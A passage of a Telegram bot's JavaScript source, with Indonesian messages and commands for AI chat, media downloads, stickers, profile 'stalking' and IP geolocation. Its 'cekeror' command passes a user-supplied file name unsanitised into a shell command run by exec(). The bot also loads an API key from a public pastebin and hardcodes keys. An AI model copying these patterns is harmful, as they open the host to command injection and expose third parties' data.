    if (!userSessions.has(userId)) userSessions.set(userId, []);
    return ctx.reply("<blockquote>🤖 AutoAI aktif! Semua pesanmu akan dibalas otomatis.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Middleware AutoAI ] -------------------- \\\
bot.on("text", async (ctx, next) => {
  const userId = ctx.from.id;
  const text = ctx.message.text;

  if (text.startsWith("/")) return next();
  if (!autoAIStatus.get(userId)) return next();

  if (!userSessions.has(userId)) userSessions.set(userId, []);
  const session = userSessions.get(userId);

  try {
    const api = `https://api-ikyyofficiall-latest.vercel.app/ai/ai4chat/chat?apikey=kyzz&question=${encodeURIComponent(text)}`;
    const res = await axios.get(api).then(r => r.data);

    if (!res.status || !res.result) return ctx.reply("<blockquote>❌ Gagal mendapatkan jawaban AI.</blockquote>", { parse_mode: 'HTML' });
    
    session.push({ question: text, answer: res.result });
    userSessions.set(userId, session);

    await ctx.reply(res.result);
  } catch (err) {
    console.error("❌ Error AutoAI:", err);
    ctx.reply("<blockquote>❌ Terjadi kesalahan saat menghubungi AI.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : tts ] -------------------- \\\
bot.command("tts", async (ctx) => {
  try {
    const text = ctx.message.text.split(" ").slice(1).join(" ");

    if (!text) {
      return ctx.reply(
        `<blockquote>❌ Format:</blockquote>\n<blockquote>/tts teks</blockquote>\n\n<blockquote>Contoh:\n/tts AldzyIsHere  banget wow</blockquote>`,
        { parse_mode: 'HTML' }
      );
    }

    const ttsUrl = `https://ikyyzyyrestapi.my.id/tools/tts?q=${encodeURIComponent(text)}`;

    await ctx.replyWithVoice(
      { url: ttsUrl },
      {
        caption: "<blockquote>🔊 text to speech Generated</blockquote>",
        parse_mode: 'HTML'
      }
    );

  } catch (err) {
    console.error("TTS ERROR:", err.message);
    ctx.reply("<blockquote>❌ Gagal membuat voice.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : ssweb ] -------------------- \\\
bot.command("ssweb", async (ctx) => {
  try {
    const url = ctx.message.text.split(" ").slice(1).join(" ");

    if (!url) {
      return ctx.reply(
        `<blockquote>❌ Format:</blockquote>\n<blockquote>/ssweb Url</blockquote>\n\n<blockquote>Contoh:\n/ssweb https://google.com</blockquote>`,
        { parse_mode: 'HTML' }
      );
    }

    if (!/^https?:\/\//i.test(url)) {
      return ctx.reply("<blockquote>❌ URL harus diawali http:// atau https://</blockquote>", { parse_mode: 'HTML' });
    }

    const ssUrl = `https://ikyyzyyrestapi.my.id/tools/ssweb?url=${encodeURIComponent(url)}`;

    await ctx.replyWithPhoto(
      { url: ssUrl },
      {
        caption: `<blockquote>🖼 <b>Screenshot Website</b></blockquote>\n\n<blockquote>🌐 ${url}</blockquote>`,
        parse_mode: "HTML"
      }
    );

  } catch (err) {
    console.error("SSWEB ERROR:", err.message);
    ctx.reply("<blockquote>❌ Gagal mengambil screenshot website.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : githubstalk ] -------------------- \\\
bot.command("githubstalk", async (ctx) => {
  const username = ctx.message.text.split(" ")[1];

  if (!username) {
    return ctx.reply(
      `<blockquote>❌ Format salah</blockquote>\n<blockquote>Contoh:\n/githubstalk ikyysukabot</blockquote>`,
      { parse_mode: 'HTML' }
    );
  }

  await ctx.reply("<blockquote>🐙 <b>Stalking GitHub...</b></blockquote>", { parse_mode: 'HTML' });

  try {
    const { data } = await axios.get(
      "https://ikyyzyyrestapi.my.id/stalk/github",
      {
        params: { apikey: "kyzz", user: username },
        timeout: 30000
      }
    );

    if (!data.status) {
      return ctx.reply("<blockquote>❌ User GitHub tidak ditemukan.</blockquote>", { parse_mode: 'HTML' });
    }

    const gh = data.result;

    const caption = `<blockquote>🐙 <b>GITHUB STALK</b></blockquote>\n<blockquote>👤 Username : ${gh.username}\n📛 Nama     : ${gh.name || "-"}\n📝 Bio      : ${gh.bio || "-"}\n🏢 Company  : ${gh.company || "-"}\n📍 Lokasi   : ${gh.location || "-"}\n📧 Email    : ${gh.email || "-"}\n🌐 Blog     : ${gh.blog || "-"}\n🐦 Twitter  : ${gh.twitter || "-"}\n📦 Repo     : ${gh.public_repos}\n📄 Gists    : ${gh.public_gists}\n👥 Followers: ${gh.followers}\n➡️ Following: ${gh.following}\n\n📆 Dibuat   : ${new Date(gh.created_at).toLocaleDateString("id-ID")}\n♻️ Update   : ${new Date(gh.updated_at).toLocaleDateString("id-ID")}</blockquote>`;

    const keyboard = {
      inline_keyboard: [[{ text: "🐙 Buka GitHub", url: gh.profile_url }]]
    };

    if (gh.avatar) {
      await ctx.replyWithPhoto(
        { url: gh.avatar },
        { caption, parse_mode: "HTML", reply_markup: keyboard }
      );
    } else {
      await ctx.reply(caption, { parse_mode: "HTML", reply_markup: keyboard });
    }

  } catch (err) {
    console.error("GITHUBSTALK ERROR:", err.message);
    ctx.reply("<blockquote>❌ Terjadi kesalahan saat mengambil data GitHub.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : mlstalk ] -------------------- \\\
bot.command("mlstalk", async (ctx) => {
  const input = ctx.message.text.split(" ");

  if (input.length < 3) {
    return ctx.reply(
      `<blockquote>❌ <b>Format salah!</b></blockquote>\n<blockquote>Contoh:\n/mlstalk 1343331387 15397</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const id = input[1];
  const zone = input[2];

  await ctx.reply("<blockquote>🔍 <b>Mengambil data Mobile Legends...</b></blockquote>", { parse_mode: "HTML" });

  try {
    const axios = require("axios");
    const { data } = await axios.get(
      `http://api.deline.web.id/stalker/stalkml?id=${id}&zone=${zone}`,
      { timeout: 10000 }
    );

    if (!data || !data.result || !data.result.success) {
      return ctx.reply("<blockquote>❌ Data player tidak ditemukan.</blockquote>", { parse_mode: 'HTML' });
    }

    const result = data.result;
    const nickname = result.username || "-";
    const region = result.region || "-";

    const caption = `
<blockquote>🎮 <b>MOBILE LEGENDS STALK</b></blockquote>
<blockquote>👤 Player Info
• Nickname: ${nickname}
• ID: ${id}
• Zone: ${zone}
• Region: ${region}

👤 Source: AldzyIsHere</blockquote>`.trim();

    await ctx.reply(caption, { parse_mode: "HTML" });

  } catch (err) {
    console.error(err.message);
    ctx.reply("<blockquote>❌ Gagal mengambil data dari API.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : ffstalk ] -------------------- \\\
bot.command("ffstalk", async (ctx) => {
  const uid = ctx.message.text.split(" ")[1];

  if (!uid) {
    return ctx.reply(
      `<blockquote>❌ <b>Format salah!</b></blockquote>\n<blockquote>/ffstalk 7987012369</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  await ctx.reply("<blockquote>🔍 <b>Mengambil data Free Fire...</b></blockquote>", { parse_mode: "HTML" });

  try {
    const axios = require("axios");
    const { data } = await axios.get(
      "https://ikyyzyyrestapi.my.id/stalk/epepid",
      { params: { uid }, timeout: 15000 }
    );

    if (!data || !data.status || !data.data) {
      return ctx.reply("<blockquote>❌ Data tidak ditemukan.</blockquote>", { parse_mode: 'HTML' });
    }

    const d = data.data;
    const formatDate = (val) => {
      if (!val) return "-";
      const date = new Date(val);
      return isNaN(date) ? "-" : date.toLocaleString("id-ID");
    };

    const caption = `
<blockquote>🎮 <b>𝖥𝖱𝖤𝖤 𝖥𝖨𝖱𝖤 𝖲𝖳𝖠𝖫𝖪</b></blockquote>
<blockquote>👤 𝖭𝗂𝖼𝗄𝗇𝖺𝗆𝖾: ${d.name}
🆔 𝖴𝖨𝖣: ${d.uid}
📊 𝖫𝖾𝗏𝖾𝗅: ${d.level}
🌍 𝖱𝖾𝗀𝗂𝗈𝗇: ${d.region}
👍 𝖫𝗂𝗄𝖾𝗌: ${Number(d.likes).toLocaleString("id-ID")}

🏆 Rank
• 𝖡𝖱 𝖯𝗈𝗂𝗇𝗍 : ${Number(d.br_rank_point).toLocaleString("id-ID")}
• 𝖢𝖲 𝖯𝗈𝗂𝗇𝗍 : ${Number(d.cs_rank_point).toLocaleString("id-ID")}

👥 Guild
• 𝖭𝖺𝗆𝖺 : ${d.guild_name || "-"}

🗓 Akun
• 𝖣𝗂𝖻𝗎𝖺𝗍: ${formatDate(d.created_at)}
• 𝖫𝗈𝗀𝗂𝗇 𝖳𝖾𝗋𝖺𝗄𝗁𝗂𝗋: ${formatDate(d.last_login)}

👤 𝖢𝗋𝖾𝖺𝗍𝗈𝗋: AldzyIsHere</blockquote>`.trim();

    await ctx.reply(caption, { parse_mode: "HTML" });

  } catch (err) {
    console.error("FF STALK ERROR:", err.message);
    ctx.reply("<blockquote>❌ Terjadi kesalahan saat mengambil data.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : videy ] -------------------- \\\
bot.command("videy", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ");

  if (!url) {
    return ctx.reply(
      `<blockquote>❌ Format salah!</blockquote>\n<blockquote>Gunakan:\n/videy link_videy</blockquote>\n<blockquote>Contoh:\n/videy https://videy.co/v?id=xxxx</blockquote>`,
      { parse_mode: 'HTML' }
    );
  }

  await ctx.reply("<blockquote>⏳ <b>Mengambil video dari Videy...</b></blockquote>\n<blockquote>Mohon tunggu.</blockquote>", { parse_mode: "HTML" });

  try {
    const axios = require("axios");
    const { data } = await axios.get(
      "https://ikyyzyyrestapi.my.id/download/videy",
      { params: { apikey: "kyzz", url }, timeout: 30000 }
    );

    if (!data || !data.success || !data.download?.url) {
      return ctx.reply("<blockquote>❌ Gagal mengambil link video.</blockquote>", { parse_mode: 'HTML' });
    }

    await ctx.replyWithVideo(
      { url: data.download.url },
      { caption: "<blockquote>🎬 <b>Videy Download Berhasil!</b></blockquote>", parse_mode: "HTML" }
    );

  } catch (err) {
    console.error("VIDEY ERROR:", err.message);
    ctx.reply("<blockquote>❌ Terjadi kesalahan saat download video.</blockquote>", { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : osintip ] -------------------- \\\
bot.command('osintip', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ');
    const ip = args[1];
    if (!ip) return ctx.reply(`<blockquote>❌ Gunakan format:</blockquote>\n<blockquote>/osintip IP</blockquote>\n\n<blockquote>Contoh:\n/osintip 180.647.XXX</blockquote>`, { parse_mode: 'HTML' });
    
    const apiUrl = `https://ikyyzyyrestapi.my.id/osint/ip?ip=${encodeURIComponent(ip)}`;
    const { data } = await axios.get(apiUrl);
    
    if (!data.status) return ctx.reply('<blockquote>❌ Gagal mengambil data OSINT IP.</blockquote>', { parse_mode: 'HTML' });
    
    const r = data.result;
    const caption = `<blockquote>🔍 <b>OSINT IP LOOKUP</b></blockquote>\n<blockquote>• IP : ${r.ip}\n• Negara : ${r.country}\n• Region : ${r.region}\n• Kota : ${r.city}\n• Kode Pos : ${r.zip}\n• Timezone : ${r.timezone}\n\n🌐 Provider\n• ISP : ${r.isp}\n• ASN : ${r.asn}\n• AS Name : ${r.as_name || '-'}\n\n📍 Koordinat\n• Latitude : ${r.location.latitude}\n• Longitude : ${r.location.longitude}\n\n🚩 Flags\n• Proxy : ${r.flags.proxy ? 'Yes' : 'No'}\n• Hosting : ${r.flags.hosting ? 'Yes' : 'No'}\n\n👤 Creator: ReyValdz</blockquote>`.trim();
    
    const lat = r.location.latitude;
    const lon = r.location.longitude;
    const mapImage = `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&size=600,400&z=12&l=map&pt=${lon},${lat},pm2rdm`;
    
    await ctx.replyWithPhoto({ url: mapImage }, { caption, parse_mode: 'HTML' });
  } catch (err) {
    console.error(err);
    ctx.reply('<blockquote>❌ Terjadi kesalahan saat memproses data.</blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : cekfunc ] -------------------- \\\
bot.command('cekfunc', async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply || !reply.text) return ctx.reply('<blockquote>⚠️ Balas pesan yang berisi kode function!</blockquote>\n<blockquote>Contoh:\nReply ke kode, lalu ketik /cekfunc</blockquote>', { parse_mode: 'HTML' });
    
    const ireng = reply.text.trim();
    if (!ireng.startsWith('async function') && !ireng.startsWith('function') && !ireng.includes('=>')) {
      return ctx.reply('<blockquote>⚠️ Kode tidak terdeteksi sebagai function JavaScript.</blockquote>', { parse_mode: 'HTML' });
    }
    
    try {
      new Function(ireng);
      await ctx.reply('<blockquote>✅ <b>Tidak ada error sintaks terdeteksi!</b></blockquote>', { parse_mode: 'HTML' });
    } catch (err) {
      let baris = '';
      const match = err.stack?.match(/<anonymous>:(\d+):(\d+)/);
      if (match) baris = `\n<blockquote>📍 Baris: ${match[1]}:${match[2]}</blockquote>`;
      
      const lines = ireng.split('\n');
      const errorLine = match ? parseInt(match[1]) - 1 : 0;
      const snippet = lines.slice(Math.max(0, errorLine - 2), errorLine + 3).join('\n');
      
      await ctx.reply(`<blockquote>❌ <b>Function Error Terdeteksi!</b></blockquote>\n\n<blockquote>📄 Pesan: ${err.message}</blockquote>${baris}\n\n<blockquote>🧩 Cuplikan Kode:\n${snippet}</blockquote>\n<blockquote>💡 Saran: Periksa tanda kurung, koma, atau kurung kurawal yang tidak ditutup.</blockquote>`, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: buttonsBot },
      });
      
      await ctx.reply('<blockquote>📋 Salin kode di atas jika ingin diperbaiki.</blockquote>', {
        reply_markup: { inline_keyboard: [[{ text: 'Contact Owner', url: 'https://t.me/ReyValdz' }]] },
      });
    }
  } catch (e) {
    console.error(e);
    ctx.reply(`<blockquote>❌ Error Di: ${e.message}</blockquote>`, { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : cekeror ] -------------------- \\\
bot.command('cekeror', async (ctx) => {
  const PASTEBIN_RAW = 'https://pastebin.com/raw/dyGe19Ls';
  const GEMINI_URL = 'https://generativelanguage.googleapis.com/v1/models/gemini-2.5-flash:generateContent?key=';
  let API_KEY_CACHE = null;
  let CACHE_TIME = 0;
  const CACHE_TTL_MS = 1000 * 60 * 10;

  async function getApiKey() {
    const now = Date.now();
    if (API_KEY_CACHE && now - CACHE_TIME < CACHE_TTL_MS) return API_KEY_CACHE;
    const response = await axios.get(PASTEBIN_RAW);
    const key = response.data.trim();
    if (!key) throw new Error('Empty API key from Pastebin');
    API_KEY_CACHE = key;
    CACHE_TIME = now;
    return API_KEY_CACHE;
  }

  async function askGemini(message) {
    const apiKey = await getApiKey();
    const payload = {
      contents: [
        {
          role: 'user',
          parts: [
            {
              text: `Kamu adalah Zephyra AI Code Analyzer.
Tugasmu:
1. Analisa error secara singkat (penyebab).
2. Buat versi kode yang sudah diperbaiki (tanpa menjelaskan solusi).
Gunakan format jawaban:
ANALYSIS: [penjelasan singkat error]
FIXED_CODE: [kode yang sudah difix tanpa codeblock]
---
${message}`,
            },
          ],
        },
      ],
    };
    const res = await axios.post(GEMINI_URL + encodeURIComponent(apiKey), payload, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 1000 * 60 * 2,
    });
    const data = res.data;
    const result = data?.candidates?.[0]?.content?.parts?.[0]?.text;
    if (!result) throw new Error('No response from Gemini');
    return result;
  }

  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply('<blockquote>❌ <b>Reply ke file atau teks kode yang ingin dicek!</b></blockquote>\n\n<blockquote>Contoh:\n/cekeror (reply ke file.js atau file.py)</blockquote>', { parse_mode: 'HTML' });
  
  let code = '';
  let filename = 'code.txt';
  
  if (reply.document) {
    const fileLink = await ctx.telegram.getFileLink(reply.document.file_id);
    const response = await axios.get(fileLink.href);
    code = response.data;
    filename = reply.document.file_name || 'code.txt';
  } else if (reply.text) {
    code = reply.text;
  } else {
    return ctx.reply('<blockquote>⚠️ <b>Invalid file or text!</b></blockquote>', { parse_mode: 'HTML' });
  }
  
  const tempPath = `./temp_${Date.now()}_${filename}`;
  fs.writeFileSync(tempPath, code);
  
  const langMap = {
    '.js': 'JavaScript',
    '.py': 'Python',
    '.php': 'PHP',
    '.json': 'JSON',
    '.html': 'HTML',
    '.css': 'CSS',
    '.cpp': 'C++',
    '.c': 'C',
    '.java': 'Java',
    '.ts': 'TypeScript',
    '.rb': 'Ruby',
    '.go': 'Go',
    '.sh': 'Shell Script',
  };
  
  let lang = 'Unknown';
  for (const ext in langMap) {
    if (filename.endsWith(ext)) {
      lang = langMap[ext];
      break;
    }
  }
  
  await ctx.reply(`<blockquote>👨🏻‍💻 <b>Analyzing file</b> ${filename} (${lang})</blockquote>`, { parse_mode: 'HTML' });
  
  let checkCmd;
  switch (lang) {
    case 'JavaScript':
    case 'TypeScript':
      checkCmd = `node --check ${tempPath}`;
      break;
    case 'Python':
      checkCmd = `python3 -m py_compile ${tempPath}`;
      break;
    case 'PHP':
      checkCmd = `php -l ${tempPath}`;
      break;
    case 'JSON':
      checkCmd = `node -e "JSON.parse(require('fs').readFileSync('${tempPath}','utf-8'))"`;
      break;
    case 'HTML':
    case 'CSS':
      checkCmd = `npx htmlhint ${tempPath} || echo "HTML/CSS check done"`;
      break;
    case 'C++':
      checkCmd = `g++ -fsyntax-only ${tempPath}`;
      break;
    case 'C':
      checkCmd = `gcc -fsyntax-only ${tempPath}`;
      break;
    case 'Java':
      checkCmd = `javac ${tempPath}`;
      break;
    case 'Shell Script':
      checkCmd = `bash -n ${tempPath}`;
      break;
    default:
      checkCmd = `node --check ${tempPath}`;
  }
  
  exec(checkCmd, async (err, stdout, stderr) => {
    fs.unlinkSync(tempPath);
    const output = stderr || stdout;
    
    if (!err && !output.match(/(error|Error|SyntaxError)/i)) {
      return ctx.reply(`<blockquote>✅ <b>No syntax errors found!</b></blockquote>\n\n<blockquote>📄 File: ${filename}\n🧠 Language: ${lang}\nStatus: Safe 🚀</blockquote>`, { parse_mode: 'HTML' });
    }
    
    const errorMsg = output.trim();
    const errorLine = errorMsg.match(/:(\d+):?(\d+)?/);
    const line = errorLine ? errorLine[1] : '?';
    const col = errorLine ? errorLine[2] || '?' : '?';
    
    const preview = `<blockquote>❌ <b>Error found!</b></blockquote>\n\n<blockquote>📄 File: ${filename}\n👨🏻‍💻 Language: ${lang}\n📍 Line: ${line}:${col}\n\n🔍 AI analysis is underway...</blockquote>`;
    await ctx.reply(preview, { parse_mode: 'HTML' });
    
    const aiResponse = await askGemini(`Bahasa: ${lang}\nFile: ${filename}\nError:\n${errorMsg}\n\nIsi kode:\n${code}`);
    const analysis = aiResponse.match(/ANALYSIS:\s*([\s\S]*?)(?=FIXED_CODE:|$)/i)?.[1]?.trim() || '-';
    const fixed = aiResponse.match(/FIXED_CODE:\s*([\s\S]*)$/i)?.[1]?.trim() || '';
    
    const header = [`<blockquote>📄 <b>File:</b> ${filename}</blockquote>`, `<blockquote>👨🏻‍💻 Language: ${lang}\n📍 Line: ${line}:${col}\n\n🧩 Analysis:\n${analysis}\n\n© AldzyIsHere</blockquote>`].join('\n');
    await ctx.reply(header, { parse_mode: 'HTML' });
    
    if (fixed.length > 5) {
      const fixedFile = `./temp/fixed_${Date.now()}_${filename}`;
      fs.writeFileSync(fixedFile, fixed);
      await ctx.replyWithDocument({ source: fs.createReadStream(fixedFile), filename: `Fixed_${filename}` });
      fs.unlinkSync(fixedFile);
    }
    
    console.log(chalk.green(`✅ Analisa selesai untuk ${filename} (${lang})`));
  });
});

/// -------------------- [ Command : brat ] -------------------- \\\
bot.command('brat', async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatType = ctx.chat.type;
  const args = ctx.message.text.split(' ').slice(1);
  const argsRaw = args.join(' ');
  
  if (!argsRaw) return ctx.reply('<blockquote>❌ <b>Syntax Error!</b></blockquote>\n\n<blockquote>Example : /brat Hello World --gif --delay=500\n\n© AldzyIsHere</blockquote>', { parse_mode: 'HTML' });
  
  try {
    const textParts = [];
    let isAnimated = false;
    let delay = 500;
    
    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else textParts.push(arg);
    }
    
    const text = textParts.join(' ');
    if (!text) return ctx.reply('<blockquote>❌ <b>Teks tidak boleh kosong!</b></blockquote>', { parse_mode: 'HTML' });
    
    if (isAnimated && (delay < 100 || delay > 1500)) return ctx.reply('<blockquote>❌ <b>Delay harus antara 100–1500 ms.</b></blockquote>', { parse_mode: 'HTML' });
    
    await ctx.reply('<blockquote>🌿 <b>Generating stiker brat...</b></blockquote>', { parse_mode: 'HTML' });
    
    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data);
    
    await ctx.replyWithSticker({ source: buffer });
    console.log(chalk.green(`✅ Brat sticker created for ${userId}`));
  } catch (error) {
    console.error(chalk.red(`❌ Brat error: ${error.message}`));
    await ctx.reply('<blockquote>❌ <b>Gagal membuat stiker brat. Coba lagi nanti ya!</b></blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : iqc ] -------------------- \\\
bot.command('iqc', async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatType = ctx.chat.type;
  const args = ctx.message.text.split(' ').slice(1).join(' ');
  
  if (!args) return ctx.reply('<blockquote>❌ <b>Example: /iqc teks</b></blockquote>', { parse_mode: 'HTML' });
  
  try {
    await ctx.reply('<blockquote>⏳ <b>Processing...</b></blockquote>', { parse_mode: 'HTML' });
    
    const url = `http://ikyyzyyrestapi.my.id/canvas/iphone-quoted?apikey=kyzz&messageText=${encodeURIComponent(args)}`;
    const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 30000 });
    
    if (response.data.length === 0) throw new Error('API returned empty response');
    
    await ctx.replyWithPhoto({ source: Buffer.from(response.data) }, { 
      caption: '<blockquote>📱 <b>iPhone Quoted Creator</b></blockquote>', 
      parse_mode: 'HTML' 
    });
    
    console.log(chalk.green(`✅ IQC created for ${userId}`));
  } catch (error) {
    console.error(chalk.red(`❌ IQC error: ${error.message}`));
    await ctx.reply('<blockquote>❌ <b>Gagal membuat quoted message. Coba lagi nanti.</b></blockquote>', { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : nulis ] -------------------- \\\
bot.command('nulis', async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatType = ctx.chat.type;
  
  try {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!text) return ctx.reply('<blockquote>❌ <b>Syntax Error!</b></blockquote>\n\n<blockquote>Example : /nulis Halo bro!\n\n© AldzyIsHere</blockquote>', { parse_mode: 'HTML' });
    
    await ctx.reply('<blockquote>⏳ <b>Sedang menulis...</b></blockquote>', { parse_mode: 'HTML' });
    
    const apiUrl = `http://ikyyzyyrestapi.my.id/canvas/nulis?apikey=kyzz&text=${encodeURIComponent(text)}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer', timeout: 30000 });
    
    if (response.data.length === 0) throw new Error('API returned empty image');
    
    const buffer = Buffer.from(response.data);
    await ctx.replyWithPhoto({ source: buffer });
    
    console.log(chalk.green(`✅ Writing completed for ${userId}`));
  } catch (error) {
    console.error(chalk.red(`❌ Nulis error: ${error.message}`));
    await ctx.reply(`<blockquote>❌ <b>Gagal membuat tulisan:</b></blockquote>\n\n<blockquote>${error.message}</blockquote>\n\n<blockquote>Silakan coba lagi dengan teks yang lebih pendek.</blockquote>`, { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : sticker ] -------------------- \\\
bot.command('sticker', async (ctx) => {
  const userId = ctx.from.id.toString();
  const chatType = ctx.chat.type;
  
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply || !reply.photo) {
      return ctx.reply('<blockquote>❌ <b>Syntax Error!</b></blockquote>\n\n<blockquote>Example : Reply photo lalu ketik /sticker\n\n© AldzyIsHere</blockquote>', { parse_mode: 'HTML' });
    }
    
    const packName = '@ReyValdz';
    const authorName = 'ReyValdz';
    const photo = reply.photo.pop();
    const fileUrl = await ctx.telegram.getFileLink(photo.file_id);
    const res = await axios.get(fileUrl.href, { responseType: 'arraybuffer' });
    
    await ctx.reply('<blockquote>🧩 <b>Lagi bikin sticker...</b></blockquote>', { parse_mode: 'HTML' });
    
    const webp = await toWebp(res.data, 'jpg', packName, authorName);
    await ctx.replyWithSticker({ source: webp.data });
    webp.delete();
    
    console.log(chalk.green(`✅ Sticker created for ${userId}`));
  } catch (error) {
    console.error(chalk.red(`❌ Sticker error: ${error.message}`));
    ctx.reply(`<blockquote>❌ <b>Gagal bikin sticker:</b></blockquote>\n\n<blockquote>${error.message}</blockquote>`, { parse_mode: 'HTML' });
  }
});

/// -------------------- [ Command : tiktok ] -------------------- \\\
bot.command('tiktok', async (ctx) => {
  const args = ctx.message.text.split(' ');
  if (!(await checkUserLimit(ctx, 'tiktok'))) return;
  
  if (args.length < 2) {
    return ctx.reply('<blockquote>⚠️ Kirim link tiktok!</blockquote>\n<blockquote>Contoh: /tiktok https://vt.tiktok.com/xxxx</blockquote>', { parse_mode: 'HTML' });
  }
  
  const urlInput = args[1];
  let loadingMsg;
  
  try {
    loadingMsg = await sendLoading(ctx, '⏳ Mengunduh video TikTok...');
    
    const apiUrl = `https://api-ikyyofficiall-latest.vercel.app/download/tiktok?apikey=kyzz&query=${encodeURIComponent(urlInput)}`;
    const response = await axios.get(apiUrl, { timeout: 30000 });
    const data = response.data;
    
    if (!data || !data.status) {
      await editLoading(loadingMsg, '<blockquote>❌ Gagal mengambil video TikTok.</blockquote>');
      return;
    }
    
    const result = data.result;
    
    if (result.video) {
      await editLoading(loadingMsg, '<blockquote>🎬 Mengirim video...</blockquote>');
      await ctx.replyWithVideo({ url: result.video }, { 
        caption: '<blockquote>🎬 <b>Sukses - TikTok Video</b></blockquote>', 
        parse_mode: 'HTML' 
      });
    }
    
    if (result.audio) {
      await editLoading(loadingMsg, '<blockquote>🎵 Mengirim audio...</blockquote>');
      await ctx.replyWithAudio({ url: result.audio }, { 
        caption: '<blockquote>🎵 <b>Sukses - TikTok Audio</b></blockquote>', 
        parse_mode: 'HTML' 
      });
    }
    
    if (result.slides && Array.isArray(result.slides) && result.slides.length > 0) {
      await editLoading(loadingMsg, '<blockquote>🖼️ Mengirim slides...</blockquote>');
      for (const [index, img] of result.slides.entries()) {
        if (img && typeof img === 'string') {
          await ctx.replyWithPhoto({ url: img }, { caption: `<blockquote>🖼️ Slide ${index + 1}</blockquote>` });
          await new Promise((resolve) => setTimeout(resolve, 500));
        }
      }
    }
    
    await ctx.deleteMessage(loadingMsg.message_id);
    console.log(chalk.green(`✅ TikTok download completed for: ${urlInput}`));
  } catch (error) {
    console.error(chalk.red(`❌ TikTok error: ${error.message}`));
    let errorMessage = '<blockquote>❌ Error: ';
    
    if (error.code === 'ECONNABORTED') {
      errorMessage += 'Timeout - Server tidak merespon';
    } else if (error.response) {
      errorMessage += `API Error ${error.response.status}`;
    } else {
      errorMessage += error.message || 'Unknown error';
    }
    errorMessage += '</blockquote>';
    
    if (loadingMsg) {
      await editLoading(loadingMsg, errorMessage);
    } else {
      await ctx.reply(`${errorMessage}`, { parse_mode: 'HTML' });
    }
  }
});

/// -------------------- [ Command : ig ] -------------------- \\\
bot.command('ig', async (ctx) => {
  const text = ctx.message.text.split(' ').slice(1).join(' ').trim();
  if (!(await checkUserLimit(ctx, 'ig'))) return;
  
  if (!text) {
    return ctx.reply('<blockquote>⚠️ Kirim link Instagram!</blockquote>\n\n<blockquote>Contoh:\n/ig https://www.instagram.com/reel/xxxx</blockquote>', { parse_mode: 'HTML' });
  }
  
  let loadingMsg;
  
  try {
    loadingMsg = await sendLoading(ctx, '⏳ Mengambil video Instagram...');
    
    const apiUrl = `https://api.deline.web.id/downloader/ig?url=${encodeURIComponent(text)}`;
    const response = await axios.get(apiUrl, { timeout: 30000 });
    console.log(chalk.blue(`[IG API RESPONSE] Status: ${response.status}`));
    
    const data = response.data;
    if (!data.status) {
      await editLoading(loadingMsg, '<blockquote>❌ Gagal mengambil data Instagram.</blockquote>');
      return;
    }
    
    const videos = data?.result?.media?.videos;
    if (!videos || videos.length === 0) {
      await editLoading(loadingMsg, '<blockquote>❌ Video tidak ditemukan</blockquote>');
      return;
    }
    
    const videoUrl = videos[0];
    
    await editLoading(loadingMsg, '<blockquote>🎬 Mengirim video...</blockquote>');
    await ctx.replyWithVideo({ url: videoUrl }, { 
      caption: '<blockquote>🎬 <b>I N S T A G R A M</b></blockquote>\n\n<blockquote>Video berhasil diunduh</blockquote>', 
      parse_mode: 'HTML' 
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
    console.log(chalk.green(`✅ Instagram download completed for: ${text}`));
  } catch (error) {
    console.error(chalk.red(`❌ IG DOWNLOAD ERROR: ${error.message}`));
    let errorMessage = '<blockquote>❌ Error: ';
    
    if (error.response) {
      console.error('STATUS:', error.response.status);
      errorMessage += `API Error ${error.response.status}`;
    } else if (error.code === 'ECONNABORTED') {
      errorMessage += 'Timeout - Server tidak merespon';
    } else if (error.request) {
      errorMessage += 'Tidak ada respon dari server';
    } else {
      errorMessage += error.message || 'Unknown error';
    }
    errorMessage += '</blockquote>';
    
    if (loadingMsg) {
      await editLoading(loadingMsg, errorMessage);
    } else {
      await ctx.reply(`${errorMessage}`, { parse_mode: 'HTML' });
    }
  }
});

/// -------------------- [ Command : mediafire ] -------------------- \\\
bot.command('mediafire', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1).join(' ').trim();
  if (!(await checkUserLimit(ctx, 'mediafire'))) return;
  
  if (!args) {
    return ctx.reply('<blockquote>❌ Format salah</blockquote>\n<blockquote>Example: /mediafire https://www.mediafire.com/...</blockquote>', { parse_mode: 'HTML' });
  }
  
  let loadingMsg;
  
  try {
